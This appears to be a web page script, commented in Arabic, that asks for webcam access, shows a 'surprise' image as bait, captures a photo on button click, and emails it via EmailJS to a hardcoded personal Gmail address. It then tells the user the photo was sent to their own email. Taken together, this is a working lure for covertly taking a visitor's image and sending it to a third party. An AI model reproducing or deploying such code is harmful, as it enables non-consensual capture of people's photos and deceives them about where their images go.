const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureButton = document.getElementById('captureButton');
const surpriseImage = document.getElementById('surpriseImage');
const context = canvas.getContext('2d');

// قم بتهيئة EmailJS
emailjs.init("YOUR_USER_ID_HERE");  // ضع هنا User ID الذي تحصل عليه من EmailJS

// طلب إذن الوصول للكاميرا
navigator.mediaDevices.getUserMedia({ video: true })
    .then(function(stream) {
        video.srcObject = stream;
        // عند قبول الإذن، قم بإظهار صورة المفاجأة
        surpriseImage.style.display = 'block';
    })
    .catch(function(err) {
        console.log("Camera not accessible: ", err);
    });

// عند الضغط على الزر، نقوم بالتقاط الصورة
captureButton.onclick = function() {
    // رسم الصورة على canvas
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // تحويل الصورة إلى بيانات Base64
    const dataURL = canvas.toDataURL('image/png');
    
    // إرسال الصورة عبر البريد الإلكتروني باستخدام EmailJS
    const templateParams = {
        to_email: 'bsh200898@gmail.com',  // ضع بريدك الإلكتروني هنا
        message: 'هذه صورة تم التقاطها من كاميرتك!',
        image_data: dataURL
    };

    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)  // ضع معرف الخدمة و القالب من EmailJS
    .then(function(response) {
        alert('تم التقاط الصورة وإرسالها إلى بريدك الإلكتروني!');
    }, function(error) {
        console.error('Error:', error);
    });
};
